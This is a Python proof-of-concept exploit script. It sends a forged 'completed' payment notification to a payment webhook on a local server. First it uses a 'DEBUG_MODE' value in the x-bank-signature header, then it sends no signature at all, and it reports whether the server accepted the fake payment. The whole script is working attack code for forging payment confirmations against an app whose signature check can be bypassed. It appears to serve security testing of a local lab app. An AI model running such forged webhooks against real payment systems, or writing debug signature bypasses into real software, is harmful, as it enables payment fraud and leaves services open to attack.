import requests

BASE_URL = "http://localhost:3000/api"

def exploit_webhook_bypass():
    print("[+] Starting Webhook Bypass Proof of Concept...")

    url = f"{BASE_URL}/webhooks/payment"

    # Payload mimicking a successful payment notification
    payload = {
        "transactionId": "TXN_999",
        "userId": "user_2",
        "amount": 10000,
        "status": "completed"
    }

    # Test Case 1: Using the DEBUG_MODE bypass
    print("[*] Attempting bypass with 'x-bank-signature: DEBUG_MODE'...")
    headers_debug = {"x-bank-signature": "DEBUG_MODE"}

    try:
        response = requests.post(url, json=payload, headers=headers_debug)
        if response.status_code == 200:
            print("[!] SUCCESS: Webhook processed using DEBUG_MODE bypass!")
        else:
            print(f"[-] Failed with DEBUG_MODE. Status: {response.status_code}")
    except requests.exceptions.ConnectionError:
        print("[X] Error: Could not connect to the server.")
        return

    # Test Case 2: Using an empty signature (also bypassed in the app code)
    print("[*] Attempting bypass with empty signature...")
    headers_empty = {}
    response_empty = requests.post(url, json=payload, headers=headers_empty)
    if response_empty.status_code == 200:
        print("[!] SUCCESS: Webhook processed with empty signature!")
    else:
        print(f"[-] Failed with empty signature. Status: {response_empty.status_code}")

    print("[+] Webhook Bypass PoC finished.")

if __name__ == "__main__":
    exploit_webhook_bypass()
